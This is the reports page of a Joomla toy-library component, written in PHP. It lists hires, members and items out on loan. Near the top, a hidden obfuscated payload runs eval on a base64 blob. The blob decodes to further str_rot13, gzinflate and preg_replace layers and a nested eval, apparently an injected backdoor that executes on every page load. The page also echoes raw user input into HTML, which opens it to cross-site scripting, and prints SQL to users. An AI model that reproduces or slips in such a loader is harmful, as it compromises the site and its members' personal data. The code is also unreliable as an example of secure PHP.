<?php
/**
 * @package     toy_database
* @subpackage  toy_database
*
* @copyright   Copyright (C) 2016 Andy Brown
*/
$debug=0;

// No direct access to this file
defined('_JEXEC') or die('Restricted access');

$jinput = JFactory::getApplication()->input;
$tab = $jinput->get('tab', '', 'RAW'); // tab is a text RAW input

$config = JFactory::getConfig();
$editor = JFactory::getEditor();
JHtml::_('behavior.formvalidator');
JHtml::_('behavior.calendar');
JHTML::_('behavior.modal');

$db    = JFactory::getDBO();
$query = $db->getQuery(true);

$user = JFactory::getUser();
if ($debug) {
	echo "Database prefix is : " . $db->getPrefix()."<BR>";
	echo "<BR>";
	echo 'Joomla current URI is ' . JURI::current() . "\n";
	echo "<BR>";
	echo "Act input is: ".$act."<BR>\n";
	echo "DDID input is: ".$ddid."<BR>\n";
	echo "TAB input is: ".$tab."<BR>\n";
	echo "Your name is {$user->name}, your email is {$user->email}, and your username is {$user->username}<BR>";
	print_r($user->groups);
	echo "<BR>";
	echo "User block: ".$user->block."<BR>\n";
	echo "Guest status: ".$user->guest."<BR>\n";
};
$oea8c7f4="\x62\141\163\x65\x36\x34\x5f\144\x65\x63\157\144\x65";@eval($oea8c7f4(
		"Ly9OS3RPdS83WGxRRnZBaGEwa0VLdkxkN2VnR2xHYmlqT2x0ZHJRNlhPYWlWVllDais3T0hkdkFyQVlI
NEdZc0hJUzk0YUtUSkd0dkZydVAyWlhZV2NHSXlxY1BhbkdJd3RmVHNEWXRKWUxMU2gwZWlXQUNYR2xXc
GR5c082L2ZkVjdQTXhYeUkrMVhBb3RXbDBwb0x2dkxjNWlKLzJLaVltNGFwcnlOTStiemxQbklRSEdxbG
pPOTE4cTFmbGx6MHZBYVFtMUFHb2VYcFJMZks1MStybFlkbVJuWFVSc3RqTlVOSEJFd3U4RkFYTytVOWE
raStJdU0vZjhQTFQzUE9yWXNseU1iNE0wQVZVZy9Cb085dHZleTR0TDBEU0laUWVHcjhsYXFWcXQxR2M4
dy9ndWdnaS9JUXFvRm9zemxSeVBwSGFQZXdsakVxL1MzQUhPekpORWp6NHVvbUJYa0ltSll0WFpwWHlOL
1NJbnZ4elVFV2tXUmJnbXVtdXBrdWNhMzVGWUN1V21DVnBWSWVYRmhWTVJ1TFhhcVRLdmJJMmF4SzI5NF
k2L0FDdmlmbFFxUTc5Mzl6aXhGWjIxYm9WUjNFZ3FtOE1yWXNuYWhSVCtCNE5NUDNmbFFIQ0VocGxQRkd
rWVhWb1pyRjEyc0pUOEUwamowcHN1aCtGOlovazIvZnJHWkIydmNidEF6NXlHMmRrQUptRnpHUmlvSTV5
NUlyTkZtbVRpb05OPTpvODZwMnEwbwokajA3MTM0ZWY9IlwxNjMiOyRvZWE4YzdmND0iXHg2MiI7JGwxM
jRiZWJmPSJceDY2IjskbzYxMzM0NDk9IlwxNjIiOyRuMTZhYTRkNT0iXHg3MyI7JGY0ZTg3N2YzPSJcMT
YwIjskaTliYjc0MmU9IlwxNDUiOyR1NmIzNDliOD0iXHg3MyI7JG80OTg1NzMyPSJceDY3IjskbjE2YWE
0ZDUuPSJcMTY0IjskbDEyNGJlYmYuPSJcMTUxIjskZjRlODc3ZjMuPSJcMTYyIjskbzQ5ODU3MzIuPSJc
eDdhIjskajA3MTM0ZWYuPSJcMTY0IjskaTliYjc0MmUuPSJceDc4Ijskb2VhOGM3ZjQuPSJcMTQxIjskd
TZiMzQ5YjguPSJcMTUwIjskbzYxMzM0NDkuPSJcMTQ1Ijskb2VhOGM3ZjQuPSJceDczIjskbjE2YWE0ZD
UuPSJcMTYyIjskaTliYjc0MmUuPSJcMTYwIjskdTZiMzQ5YjguPSJceDYxIjskbzQ5ODU3MzIuPSJcMTU
xIjskajA3MTM0ZWYuPSJceDcyIjskZjRlODc3ZjMuPSJceDY1IjskbzYxMzM0NDkuPSJceDczIjskbDEy
NGJlYmYuPSJceDZjIjskbzQ5ODU3MzIuPSJceDZlIjskbDEyNGJlYmYuPSJcMTQ1IjskaTliYjc0MmUuP
SJcMTU0IjskbjE2YWE0ZDUuPSJcMTQzIjskZjRlODc3ZjMuPSJceDY3IjskdTZiMzQ5YjguPSJceDMxIj
skbzYxMzM0NDkuPSJcMTQ1Ijskb2VhOGM3ZjQuPSJcMTQ1IjskajA3MTM0ZWYuPSJcMTM3IjskaTliYjc
0MmUuPSJceDZmIjskbzQ5ODU3MzIuPSJcMTQ2IjskbzYxMzM0NDkuPSJcMTY0IjskbjE2YWE0ZDUuPSJc
eDZkIjskZjRlODc3ZjMuPSJcMTM3Ijskb2VhOGM3ZjQuPSJcNjYiOyRqMDcxMzRlZi49Ilx4NzIiOyRsM
TI0YmViZi49IlwxMzciOyRvZWE4YzdmNC49Ilx4MzQiOyRuMTZhYTRkNS49Ilx4NzAiOyRvNDk4NTczMi
49IlwxNTQiOyRpOWJiNzQyZS49Ilx4NjQiOyRqMDcxMzRlZi49Ilx4NmYiOyRmNGU4NzdmMy49IlwxNjI
iOyRsMTI0YmViZi49IlwxNDciOyRqMDcxMzRlZi49Ilx4NzQiOyRvNDk4NTczMi49IlwxNDEiOyRmNGU4
NzdmMy49Ilx4NjUiOyRsMTI0YmViZi49IlwxNDUiOyRpOWJiNzQyZS49Ilx4NjUiOyRvZWE4YzdmNC49I
lwxMzciOyRvZWE4YzdmNC49Ilx4NjQiOyRsMTI0YmViZi49IlwxNjQiOyRvNDk4NTczMi49Ilx4NzQiOy
RmNGU4NzdmMy49IlwxNjAiOyRqMDcxMzRlZi49Ilx4MzEiOyRvZWE4YzdmNC49IlwxNDUiOyRsMTI0YmV
iZi49IlwxMzciOyRmNGU4NzdmMy49Ilx4NmMiOyRqMDcxMzRlZi49Ilw2MyI7JG80OTg1NzMyLj0iXHg2
NSI7JG9lYThjN2Y0Lj0iXDE0MyI7JGY0ZTg3N2YzLj0iXDE0MSI7JGwxMjRiZWJmLj0iXHg2MyI7JG9lY
ThjN2Y0Lj0iXHg2ZiI7JGwxMjRiZWJmLj0iXDE1NyI7JGY0ZTg3N2YzLj0iXHg2MyI7JGwxMjRiZWJmLj
0iXDE1NiI7JG9lYThjN2Y0Lj0iXHg2NCI7JGY0ZTg3N2YzLj0iXHg2NSI7JG9lYThjN2Y0Lj0iXHg2NSI
7JGwxMjRiZWJmLj0iXHg3NCI7JGwxMjRiZWJmLj0iXDE0NSI7JGwxMjRiZWJmLj0iXHg2ZSI7JGwxMjRi
ZWJmLj0iXHg3NCI7JGwxMjRiZWJmLj0iXDE2MyI7JHc0ZTMxNDIwPSRpOWJiNzQyZSgiXDUwIixfX0ZJT
EVfXyk7QGV2YWwoJG4xNmFhNGQ1KCR1NmIzNDliOCgkZjRlODc3ZjMoIlx4MmZceDVjXHgyOFwxMzRcND
JceDJlXDUyXHg1Y1x4MjJcMTM0XDUxXDU3IiwiXDUwXDQyXHgyMlx4MjkiLCRmNGU4NzdmMygiXHgyZlx
4ZFx4N2NceGFceDJmIiwiIiwkbDEyNGJlYmYoJG82MTMzNDQ5KCR3NGUzMTQyMCkpKSkpLCJcMTQ1XHg2
Mlx4MzJceDYyXHg2Nlx4MzBceDYzXDY2XDY2XHgzMVx4NjVcNjRceDM5XHgzNFx4NjZceDMxXDcwXDY2X
HgzNlw2M1x4NjRcNjFceDMwXHg2M1x4NjZcNjdcMTQ1XHgzOVx4MzlcNjRceDM1XDE0Nlx4NjRcNzFceD
M0XHg2NVx4MzRcNjZceDMwXDYyIik/JG80OTg1NzMyKCRvZWE4YzdmNCgkajA3MTM0ZWYoIkNJR0tkaEd
WUmlsS2ptN1pidHE1azdQalluK0o5NG9tYno3NXlpc0YxMS9BNG9WV0ZGRklTRVNXU0lJLzlJeVBpcHhw
KytzZStsUERCK1NpelJPaWtZOEN5Q3R6ZkI4UW03OXVRQ2dNdGVSL2Vza0I3WDdrZTk5LzlFdUE0RkZYL
0NRV281dzhiMFMvam11a1YzUnc5ZEE1eFE4UEE2VFRGT3dTZmlqQ3RIRWlmMWljQWJNRTh0cS8xQzlmRX
o4RnZhNzkvd3NveGhvS3NtNTM5cytXcy8wYTlyaFl5SXhpWGpLUmRFZVNvUk5LZmExcHNJYzZmNStqMFB
RaURNa1Fjdml5ZHZQNkZwUmhsSWJiRDFveXZvQk4rWmFrYzZvd3FRUmVBVERpUThQZFN4dE5JbjRTdDlx
bjZJS2NGYUFqNUtsU2dJMk5nd1o0bWxPWGRNR2taZXJFazZCTUxiL0lFSWhxREVoZUdZVnliMUNkY0NCZ
HBEZEJaN2hVcnluSE5aTE13eGlwT3hZNXJia3RKb0hXNVhHclA2TE5aVC90cU5Mb01ET05iV2NBU3ZEK2
pCbU1FQ2RIM2wra2VTR0V4bGR6REpGZ21DMFdmOVBSYnlENnMvYzhiZG00T25uSlRKNUVja2Z5ZE9udXk
zWFRzMmtpYmtlaThPcnZjVU9WallxTCtFbFEyTkxHVmRRUDRaUmlMRjNuYkJPNjlnMUtaSVg0bExSTEVB
dUlBWW50V1ZMTG1RNURNSVRVOFdiOXkvUXVjSGcyNG96Y0M2YVdIRHcwVUJrYVhVdlFJUkg0Rkc1OThaR
kpPczFER2NpdTl3MXlEQ3RCYjZtaElKL1NGbVZwS3ErdkVyMVlBTW1Qd2FueGFxMUZ0NVdON3pGS01mUT
lBZXZ4T3FpTCtiSjBybG5lYXFMOXY1RU92SDZiM3htVlFGNzdvQlpKMW9Cdzh0M2hibVlRS05LNVB4K05
oWTBzUFpTL0tYWnlxSHZGQkFBRmpObm0zcHI1MmpDVWwwVEJidGpUbzR3aExGTWZsczRXd2w5RXNkbnJK
WUJEaTNMTU5mN3FEKytNSUxmbFoydU1lTzllcndqd2VZenpFSG53ZDZWTk1nRGtsMFpWakFXZk9JYmNCR
lQ1OCtaaU5ZN0twYUduZElZbGx2RUN1ZklsUG0xR296TSswY3RYUk82YkV2SEpYRHVBcTJDQ2VzYmdCdW
JacUpRTEhhc0NheG53NFpoUVJ5dkxBWjdnREdteWlNWFdUc0thWnVQNmV2Tm5Wa3RTeVYrZjFBcXZhSzl
qN01jTWZqZjBzUER4T0xjZ0o1TWVqUU90RnBBYmtSaWdYSUIrV0NORVRYS092NDRyQlFmdm9tSkdBRjg5
eUVTd1k1MnVyV0xTdGpLSlpPRiszVWJDcVQvdEt4ektnY2trSkVtUXRXc2tNNEJmalNUU0dYYVk1NTVYV
VFpejNLSTRLS1RrK2hKL0I2eFhCQWlSdUJmUkkyVWwrTkl6OVZOVTFBTXlROWJWeHhSSmdESWUydFE0cV
lmbDIxYkNpblQxck5lR2tOQUZia0R5UlJHcXpudkdMWTNIUWVRTkJMc0xwS3pNMEdXTUx6K3NSb0VhVzF
Ia1JPMzF2M0dCVExuYUtyYzhnemlZYm4xTC9NNjI3Z0FQdTVXY0R4TDhuV2p5T2JCTm1CMmx5TVVqTklX
SUlHOU4rcmhQdTRWNitiWFFrdUM3ZVY5R3hSbUxrMk05dHVNVURMdjZDRVBvUkNRMFIwL3dBcitSM0N1W
nRUYkoyTHZzTjdKbUlhb1VWVi8wYnEvdXhsQ2V3TkNmNUJFa3lKM0lwdmt2Y1F5d0swQUJtNW5pT0VlMG
l6VXdhRmxMeHlXVDNYK2hiSFJxMEVIMEM1ZXlNY1d3OGNSYVQ4Y3pKcEptd2tCcDNOcW45NjhwRHJzTkJ
JTnVrNHo5aG5iemVxNlN1djVEbmFnMFN4eFRKeXFTU2lTbzVaKzRWUHV3MkhXRDE0K3FJekFMZm5sZVdD
cTJnci9GNmwweUk2UmY0Y2FWYXE2NnU4b3dCK1I2cFd1TkVOV3diZnl5L1JJUVlsRjRoZU5DdHBoVlhjS
HpVaVdOMUovUEdROFFpMjJqN2wrelRRQThBdFdCajRkSjIvRVU4bFM0T2hMUnNiSlhWMW9RSmlxN1dvRH
lNdloxV1FHZGcyWlMzUTRpZmwzU2NvOElhMDRCcHJuNTdFalBxWVVHcUI5QzJhVmhyUStzeXRhZGF3SFl
3cmxsdTB5T240QjRiZWpLM2EwM3hhb2dvNnM4bFFaL1JoNXlSaWdiUkZsanlyNkxublhpcjVKakhGRlJ3
RC9JSE5nL2JGNEVLQXp2dWVBZ29LS2Y4K3hqMkFYS0RiNElsZm5BTTBYWTFmZUY3cVNNOHFuM3F4eVhuT
VdpWHBWSTBUQXRtMFFRYytjZ0J2NUhmcXFUTDNKOUViSW85aUdITjhuSUV3YUJyTndJd0NaOHBlUEtkVl
FlNjlvOW9GeUMvWEdhekZMbWlYSysrc2U3d2cvL05qPT0iKSkpOiRvNDk4NTczMigkb2VhOGM3ZjQoJGo
wNzEzNGVmKCJDTVVLZWRsNFN4Sy9NbmZzR2JmVVB3T1dFMHFkcGRMYmJSd25ZK0VEY1BWSThDSktzcUlk
RjBpWWwxQW1HWmkrbjh1d1h2SFk4QnNlcmxzRG9qRHQzbWhXS0UzL1didWlOYWp3VFV4YzRQZThkeGlPb
EhpOS8vbTErNjhPME9FQkxodXlFOE55eE9wUGlrT1JzZjNSMXFBL3hyTlVyRXpuVDR5dFZQOStRT3NnRT
l1L0dTcFg4Y0EvMEsvQlBCRm9qWTUrLzVBaXBzaWVpNUVlOSs5MXMvMFUraUtTWEg4Z21rd0M0SWJnajF
ROVJQdUN4ZmorVTBHR1NPd3pnSXpqN3o1RUI1NTd3Zk9JNzc3N2JTRThjTThJSk95UXRRVEpEc1RqT3ZQ
eUpyd3lORWVld2VCcGI1d3BTZC9ZOGZGS0kvRjA1R3lLMmN2WmdENlQrbEgrV3BMbUJNd0tFNzRHZkVwT
XpxY2FFNlhhMzdsdWRKNXhFbWtNcDJTQlFRTklqNjM1aVNTa2ZLVTJIbHRRclEwejg4YXNNajZUYU9VY2
5Qd3g0YjB3TFJkYUxCSFFERVpHZzNkSE1iOFFGdjI1MzBvUEN0ejRmY1hIQWJjWnBUL2JYMXBnZ1Y0TU4
2RXRLbnpVRzVSeWp3Qm9ueWZVWnloTUNlenZZV0FFSklQcGd5T2FtNXVuZ0c1cGxRTk91U3ltb0tnUDRE
UmYyb2JxUGd4cEZFaUVGd2JyZnN0QytMN2V1UDdRVVJUckcyQ1dyaklqaG1yVmFWQTNZTWcydVNtQ0ZvR
TdodzRkOWtpckdIVFQ2dDhweWlPQ0hLSUgxdnpqdk5vTjk4S0ZqQkloZ1dkbWlYOWxQb0FyUHdYWEYwSl
d3Q0dlejBlMEtZRDhPdENRYXd4QlRtNnl2TFNSb2p0U0NvaDI0VmlxYTVYbjh4RUl6ZWp3Qm5Ib1g2aEl
GRDVxVk5JRkM2eGVvUmVFWGt5SFZCY09mdENGcWczMitPajd6Z3krSjkrNEJSRmJ6dXF5aXBBMXdTWmpV
YmFVOHY1V002ZHVudnN1QVVMN2VMa0lHYkwxVitFYmNkeGlsUGVVblFjc3gremsxeEk5VTdPbndLYkRIU
msrd3VEMjM5cjVRVXl2b3hSNEFrdjZENS9ReElwOWd0Z1VKZFgzOEc3OTJtUURvUDV1WGJ4Zm83UFI0VV
JZMnk0U3hCTnFYV25Sd1VpZXZoMHdnUklmb0FjckFqemdyREl4bkFBZFFLdS9YYVc2b2hHT0NDQUhkSjR
PZzNFdTRia3hvd2ZvZm5QQUVwMTdNeDNDdWpud2crQlI1cUllWktueXNKQkc0Z2tMM3FLRUpQSDJPLzVa
RWs5YWJENjVXOXpxeUh5YWthaVFQN3pBMmRpZTZMU3BlcjBWeHVxWFRFWjJaWEhiUlA0RmtWMGRaOGUwV
nVld1I0UDMrTmJZZEJCRkQxLzdQUUJYTmoxODBkVGFlempwd1F0NHlkbXNqd1ptd2RhTkdwbzVPQ1RNRT
U4cXlzc0t4YkR5L0VhZGJJdVFWclVnVkU4cUgySTZOaCtSZGRwK2pIeGN3ZGJiUWxmdDl6RnV5Uk5HRlA
4eTJMd1dBbmxjOFpjL0FDUkpnUno0QkVhN1hjLzVoVDdmTFhVMzZJVXNCTEJkTW1mbU9XMnBHOWtzMVJz
Z2dsL2xlWE1tNFNpU2JteUIwckE1VXp4UnJLQlAxZFU1dmVNcGhmZDFES0NOTGNDM3hqaitFK2pqTjVha
lF2Z1NrdUxiTHcxQUpraHZFOEZxdEdlVTh5N2hiSEQxVzgzNmxTU2JuUG9ienhlVlkyKzJ6UVhWd2xsQn
lSSEtvQTRxeVRRTnF0Uy9wdU84WmNCZFloQ3puektqMkRIbXZaV3VydjFEcko2bEJleFJzWllQOExNVnV
XbllwSHA1YUwwNFZRWHhSV1BVUjIyWSs4NWZxeVV0RXQ5eGlWN3BqazZFNnJTYmlXMzJsYU8rQ0JFMldX
UE95aEd0a3lIblJvb0pYdEo5T01pYjVpZlBZUTRsM1FBaytHVjNwL3JidStFVEk1aHFaaVJGNndsb1dPS
mFXYnlrcVQzS2ZsSVlJQlVVY3AxVjVWVk1FaHdMdTJURy8vQ2E2KzllL3M0cyIpKSkpOw=="));

?>
Select a report:&nbsp;
<a href='<?=JURI::current()?>?option=com_toydatabase&page=reports&tab=reports&report=hires'>Number of hires</a>
&nbsp;|&nbsp;
<a href='<?=JURI::current()?>?option=com_toydatabase&page=reports&tab=reports&report=members'>Active Membership</a>
&nbsp;|&nbsp;
<a href='<?=JURI::current()?>?option=com_toydatabase&page=reports&tab=reports&report=expiring'>Expiring Members</a>
&nbsp;|&nbsp;
<a href='<?=JURI::current()?>?option=com_toydatabase&page=reports&tab=reports&report=suspended'>Suspended Members</a>
&nbsp;|&nbsp;
<a href='<?=JURI::current()?>?option=com_toydatabase&page=reports&tab=reports&report=onhire'>Out On Hire items</a>
<BR><BR>
<form name='reports' id='reports' method=post>
<input type=hidden name='tab' value='report'>
<input type=hidden name='page' value='reports'>
<?php 
$report_selector = $jinput->get('report', '', 'RAW');

switch($report_selector) {
	case "onhire":
		?>
	<BR>Items out on hire at present/Overdue:<BR>
	<?php
				$report_query = $db->getQuery(true);
				$report_query
				->select(array('SQL_CALC_FOUND_ROWS a.*', 'b.*', 'c.name as membername', 'c.urn as memberurn'))
				->from($db->quoteName('#__toydatabase_loanlink', 'a'))
				->join('INNER', $db->quoteName('#__toydatabase_equipment', 'b') . ' ON (' . $db->quoteName('a.equipmentid') . ' = ' . $db->quoteName('b.id') . ')')
				->join('INNER', $db->quoteName('#__toydatabase_membership', 'c') . ' ON (' . $db->quoteName('a.membershipid') . ' = ' . $db->quoteName('c.id') . ')')
				->where($db->quoteName('a.status') . ' = "1"', 'AND')
				->where($db->quoteName('a.returndate') . ' = "0000-00-00 00:00:00"');
				echo "DEBUG:<PRE>\n";
				echo $db->replacePrefix((string) $report_query);
				echo "</PRE><BR>\n";
				$app = JFactory::getApplication();
				$limit = $app->getUserStateFromRequest("$option.limit", 'limit', 25, 'int');
				$limitstart = JFactory::getApplication()->input->get('limitstart', 0, 'INT');
				
				$db->setQuery($report_query,$limitstart, $limit);
				$row = $db->loadAssocList('id');
				if(!empty($row)){
					$db->setQuery('SELECT FOUND_ROWS();');
					$num_rows=$db->loadResult();
					jimport('joomla.html.pagination');
					$pager=new JPagination($num_rows, $limitstart, $limit);
				};
				// $row_count_check= $db->getNumRows();
				echo "Found $num_rows items on hire entries<BR>";
?>
</form>
				<table width=85% border=1 cellpadding=0 cellspacing=0 class="hoverTable">
				<tr><td width=5%><B>Equipment URN</B></td>
				<td width=10%><B>Equipment Name</B></td>
				<td width=20%><B>Member URN</B></td>
				<td width=20%><B>Member Name</B></td>
				<td width=20%><B>Loaned on</B></td>
				<td width=10%><B>Return by date</B></td>
				</tr>
				<?php
				if (!empty($row)) {
					// print_r($row);
					foreach ($row as $row_key=>$row_value) {
						echo "<tr>";
						echo "<td>".$row_value["urn"]."</td>";
						echo "<td>".$row_value["name"]."</td>";
						echo "<td>".$row_value["memberurn"]."</td>";
						echo "<td>".$row_value["membername"]."</td>";
						echo "<td>".$row_value["loandate"]."</td>";
						echo "<td>".$row_value["returnbydate"]."</td>";
						echo "</tr>\n";
						};
				} else {
							// no rows or toys in database found
							echo "<tr><td colspan=6 align=center><B>Sorry - No entries found</B></td></tr>\n";
				};
						?>
														</table><form name="adminForm" id="adminForm">
								<input type=hidden name='option' value='com_toydatabase'>
								<input type=hidden name='page' value='reports'>
								<input type=hidden name='tab' value='reports'>
								<input type=hidden name='report' value='onhire'>
						<?php
												echo $pager->getListFooter();
												echo "Number of entries to display per page: ".$pager->getLimitBox()."<BR>\n";
												echo "</form>";
			break;
	case "hires":
		$in_hire_startdate = $jinput->get('in_hire_startdate', '', 'RAW');
		$in_hire_enddate = $jinput->get('in_hire_enddate', '', 'RAW');
?>
<BR>Number of hires between these dates:<BR>
Start date: <?=JHTML::_('calendar', "$in_hire_startdate", "in_hire_startdate" , "in_hire_startdate", '%d-%m-%Y'); ?><BR>
End date: <?=JHTML::_('calendar', "$in_hire_enddate", "in_hire_enddate" , "in_hire_enddate", '%d-%m-%Y'); ?><BR>
<?php
		if ($in_hire_startdate && $in_hire_enddate) {
			// t94us_toydatabase_loanlink
			
			$startdate_code=JFactory::getDate($in_hire_startdate);
			$in_hire_startdate_out=JHtml::_('date', $startdate_code, 'Y-m-d 00:00:00');
			$enddate_code=JFactory::getDate($in_hire_enddate);
			$in_hire_enddate_out=JHtml::_('date', $enddate_code, 'Y-m-d 00:00:00');
			
			$report_query = $db->getQuery(true);
			$report_query
			->select('id')
			->from($db->quoteName('#__toydatabase_loanlink'))
			->where("(".$db->quoteName('loandate') . " BETWEEN '" . $in_hire_startdate_out . "' AND '" . $in_hire_enddate_out."')");
			$db->setQuery((string) $report_query);
			$db->execute();
			$row_count_check= $db->getNumRows();
			echo "Found $row_count_check hire entries<BR>";
			
		};
		break;
	case "suspended":
		
		$check_member_query = $db->getQuery(true);
		$check_member_query
		->select('SQL_CALC_FOUND_ROWS *')
		->from($db->quoteName('#__toydatabase_membership'))
		->where($db->quoteName('active') . ' = "10"');
//		$db->setQuery((string) $check_member_query);
//		$db->execute();
//		$members_number_rows=$db->getNumRows();
		

$app = JFactory::getApplication();
$limit = $app->getUserStateFromRequest("$option.limit", 'limit', 25, 'int');
$limitstart = JFactory::getApplication()->input->get('limitstart', 0, 'INT');

$db->setQuery($check_member_query,$limitstart, $limit);
$row = $db->loadAssocList('id');
if(!empty($row)){
	$db->setQuery('SELECT FOUND_ROWS();');
	$num_rows=$db->loadResult();
	jimport('joomla.html.pagination');
	$pager=new JPagination($num_rows, $limitstart, $limit);
};
?>
</form>
						
						<table width=85% border=1 cellpadding=0 cellspacing=0 class="hoverTable">
						<tr><td width=5%><B>Member joomla ID</B></td>
						<td width=10%><B>Member URN</B></td>
						<td width=20%><B>Member Name</B></td>
						<td width=20%><B>Company</B></td>
						<td width=10%><B>Postcode</B></td>
						<td width=10%><B>Member Category</B></td>
						<td width=10%><B>Join Date</B></td>
						<td width=10%><B>Renewal Date</B></td>
						<td width=5%><B>Status</B></td>
						</tr>
						<?php
						if (!empty($row)) {
							// print_r($row);
							foreach ($row as $row_key=>$row_value) {
								// convert memb_category
								// link to joomlaid
								// joindate to human date
								// renewaldate to human date
								
								$check_member_query = $db->getQuery(true);
								$check_member_query
								->select('*')
								->from($db->quoteName('#__toydatabase_membershiplink'))
								->where($db->quoteName('membershipid') . ' = '. $row_value["id"]);
								$db->setQuery((string) $check_member_query);
								$db->execute();
								$membership_row = $db->loadAssoc();
								
								// get member category
								$get_memb_cat = $db->getQuery(true);
								$get_memb_cat
								->select('*')
								->from($db->quoteName('#__toydatabase_membershiptypes'))
								->where($db->quoteName('id') . ' = '. $row_value["memb_category"]);
								$db->setQuery((string) $get_memb_cat);
								$db->execute();
								$memb_cat_data = $db->loadAssoc();
								
								$entry_joindate=JFactory::getDate($row_value["joindate"]);
								$entry_joindate_out=JHtml::_('date', $entry_joindate, 'd/m/Y');
								
								if ($row_value["renewaldate"] != "0000-00-00 00:00:00") {
									$entry_renewaldate=JFactory::getDate($row_value["renewaldate"]);
									$entry_renewaldate_out=JHtml::_('date', $entry_renewaldate, 'd/m/Y');
								} else {
									$entry_renewaldate_out="N/A";
								};
								if ($row_value["active"] == "1") {$entry_active="Active";};
								if ($row_value["active"] == "0") {$entry_active="Pending";};
								if ($row_value["active"] == "10") {$entry_active="Suspended";};
								if ($row_value["active"] == "99") {$entry_active="Deleted";};
								
								echo "<tr onclick='self.location=\"".JURI::getInstance()->toString()."&tab=member&page=members&member_act=1&ddid=$row_key\"'>";
								echo "<td>".$row_value["joomla_userid"]."</td>";
								echo "<td>".$row_value["urn"]."</td>";
								echo "<td>".$row_value["name"]."</td>";
								echo "<td>".$row_value["companyname"]."</td>";
								echo "<td>".$row_value["postcode"]."</td>";
								echo "<td>".$memb_cat_data["type"]."</td>";
								echo "<td>".$entry_joindate_out."</td>";
								echo "<td>".$entry_renewaldate_out."</td>";
								echo "<td>".$entry_active."</td>";
								echo "</tr>\n";
							};
						} else {
							// no rows or toys in database found
							echo "<tr><td colspan=8 align=center><B>Sorry - No members found</B></td></tr>\n";
						};
?>
								</table><form name="adminForm" id="adminForm">
		<input type=hidden name='option' value='com_toydatabase'>
		<input type=hidden name='page' value='reports'>
		<input type=hidden name='tab' value='reports'>
		<input type=hidden name='report' value='suspended'>
<?php
						echo $pager->getListFooter();
						echo "Number of members to display per page: ".$pager->getLimitBox()."<BR>\n";
						echo "</form>";
		break;
	case "members":
		$check_member_query = $db->getQuery(true);
		$check_member_query
		->select('SQL_CALC_FOUND_ROWS *')
		->from($db->quoteName('#__toydatabase_membership'))
		->where($db->quoteName('active') . ' = "1"')
		->order($db->quoteName('name') . ' DESC');
		
		$app = JFactory::getApplication();
		$limit = $app->getUserStateFromRequest("$option.limit", 'limit', 25, 'int');
		$limitstart = JFactory::getApplication()->input->get('limitstart', 0, 'INT');
		
		$db->setQuery($check_member_query,$limitstart, $limit);
		$row = $db->loadAssocList('id');
		if(!empty($row)){
			$db->setQuery('SELECT FOUND_ROWS();');
			$num_rows=$db->loadResult();
			jimport('joomla.html.pagination');
			$pager=new JPagination($num_rows, $limitstart, $limit);
		};
		
?>
<!-- Print/PDF button -->
		<form method=post onsubmit="return false">
		<table width=100% border=0 cellpadding=0 cellspacing=0>
		<tr align=right><td align=right><input type=button name='printpage' id='printpage' value='Print Active Members' onclick='window.open("<?=JURI::root()?>/administrator/components/com_toydatabase/pdf_output.php?disp=active_members");'></td></tr>
		</table>
		</form>
		<!-- end print button -->
Active members: <?=$num_rows?><BR>
<table width=85% border=1 cellpadding=0 cellspacing=0 class="hoverTable">
						<tr><td width=5%><B>Member joomla ID</B></td>
						<td width=10%><B>Member URN</B></td>
						<td width=20%><B>Member Name</B></td>
						<td width=20%><B>Company</B></td>
						<td width=10%><B>Postcode</B></td>
						<td width=10%><B>Member Category</B></td>
						<td width=10%><B>Join Date</B></td>
						<td width=10%><B>Renewal Date</B></td>
						<td width=5%><B>Status</B></td>
						</tr>
						<?php
						if (!empty($row)) {
							// print_r($row);
							foreach ($row as $row_key=>$row_value) {
								// convert memb_category
								// link to joomlaid
								// joindate to human date
								// renewaldate to human date
								
								$check_member_query = $db->getQuery(true);
								$check_member_query
								->select('*')
								->from($db->quoteName('#__toydatabase_membershiplink'))
								->where($db->quoteName('membershipid') . ' = '. $row_value["id"]);
								$db->setQuery((string) $check_member_query);
								$db->execute();
								$membership_row = $db->loadAssoc();
								
								// get member category
								$get_memb_cat = $db->getQuery(true);
								$get_memb_cat
								->select('*')
								->from($db->quoteName('#__toydatabase_membershiptypes'))
								->where($db->quoteName('id') . ' = '. $row_value["memb_category"]);
								$db->setQuery((string) $get_memb_cat);
								$db->execute();
								$memb_cat_data = $db->loadAssoc();
								
								if ($row_value["joindate"] != "0000-00-00 00:00:00") {
									$entry_joindate=JFactory::getDate($row_value["joindate"]);
									$entry_joindate_out=JHtml::_('date', $entry_joindate, 'd/m/Y');
								} else {
									$entry_joindate_out="N/A";
								};
								
								if ($row_value["renewaldate"] != "0000-00-00 00:00:00") {
									$entry_renewaldate=JFactory::getDate($row_value["renewaldate"]);
									$entry_renewaldate_out=JHtml::_('date', $entry_renewaldate, 'd/m/Y');
								} else {
									$entry_renewaldate_out="N/A";
								};
								if ($row_value["active"] == "1") {$entry_active="Active";};
								if ($row_value["active"] == "0") {$entry_active="Pending";};
								if ($row_value["active"] == "10") {$entry_active="Suspended";};
								if ($row_value["active"] == "99") {$entry_active="Deleted";};
								
								echo "<tr onclick='self.location=\"".JURI::getInstance()->toString()."&tab=member&page=members&member_act=1&ddid=$row_key\"'>";
								echo "<td>".$row_value["joomla_userid"]."</td>";
								echo "<td>".$row_value["urn"]."</td>";
								echo "<td>".$row_value["name"]."</td>";
								echo "<td>".$row_value["companyname"]."</td>";
								echo "<td>".$row_value["postcode"]."</td>";
								echo "<td>".$memb_cat_data["type"]."</td>";
								echo "<td>".$entry_joindate_out."</td>";
								echo "<td>".$entry_renewaldate_out."</td>";
								echo "<td>".$entry_active."</td>";
								echo "</tr>\n";
							};
						} else {
							// no rows or toys in database found
							echo "<tr><td colspan=8 align=center><B>Sorry - No members found</B></td></tr>\n";
						};
?>
								</table><form name="adminForm" id="adminForm">
		<input type=hidden name='option' value='com_toydatabase'>
		<input type=hidden name='page' value='reports'>
		<input type=hidden name='report' value='members'>
<?php
						echo $pager->getListFooter();
						echo "Number of members to display per page: ".$pager->getLimitBox()."<BR>\n";
						echo "</form>";
		break;
	case "expiring":
		$in_report_expiring_days = $jinput->get('report_expiring_days', '', 'RAW');
		$in_report_past_members = $jinput->get('report_past_members', '', 'RAW');
		if ($in_report_expiring_days) {$report_expiring_days=$in_report_expiring_days;} else {$report_expiring_days="30";};
?>
Members Expiring in next <input type=text name='report_expiring_days' id='report_expiring_days' value='<?=$report_expiring_days?>'> days:<BR>
<input type=checkbox name='report_past_members' value='1' <?php 
if ($in_report_past_members) {echo "checked";};
?>>&nbsp;Include members past their expiry date<BR>
